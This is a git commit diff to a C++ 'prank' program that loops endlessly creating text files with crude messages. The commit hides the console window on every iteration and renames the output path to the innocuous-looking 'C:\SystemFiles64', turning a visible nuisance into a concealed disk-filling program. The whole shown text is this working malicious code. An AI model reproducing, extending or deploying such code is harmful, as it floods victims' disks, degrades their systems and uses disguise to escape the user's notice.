84adeef9a1c00e4228e3b3e819b71cafb61693ce
letiiletii <65872381+letiiletii@users.noreply.github.com>
2021-02-19 20:39:16 +0100

    Update hideconsole

--- Source.cpp
+++ Source.cpp
@@ -2,19 +2,26 @@
 #include <fstream>
 #include <string>
 #include <direct.h>
+#include <Windows.h>
 
-main()
+void HideConsole()
+{
+	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+}
+
+int main()
 {
 	long i = 0;
-	const char *path = "C:\\GetPranked";
+	const char *path = "C:\\SystemFiles64";
 	std::string content = "Get fucked gibba";
 	_mkdir(path);
 	while (true)
 	{
+		HideConsole();
 		i++;
 		std::ofstream file;
 		file.open(path + std::to_string(i) + ".txt", std::ios_base::out);
-		file << content;
+		file << "suck on these nutssuck on these nutssuck on these nutssuck on these nutssuck on these nutssuck on these nutssuck on these nutssuck on these nutssuck on these nutssuck on these nuts";
 		file.close();
 		std::cout << "File created;" + std::to_string(i) + "\r\n";
 	}
